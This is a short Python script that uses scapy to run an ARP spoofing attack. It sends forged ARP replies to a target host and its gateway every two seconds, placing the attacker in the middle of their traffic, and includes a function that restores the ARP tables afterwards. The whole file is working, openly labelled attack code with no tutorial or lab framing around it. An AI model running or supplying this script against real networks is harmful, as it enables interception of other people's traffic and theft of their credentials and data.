import time
from scapy.all import ARP, send
from network_scanner import get_mac

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_response, verbose=False)

def restore_arp(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac and spoof_mac:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
        send(arp_response, count=4, verbose=False)

def arp_spoof_attack(target_ip, gateway_ip):
    print(f"[*] Starting ARP spoofing attack on {target_ip} (target) and {gateway_ip} (gateway)")
    while True:
        arp_spoof(target_ip, gateway_ip)
        arp_spoof(gateway_ip, target_ip)
        time.sleep(2)
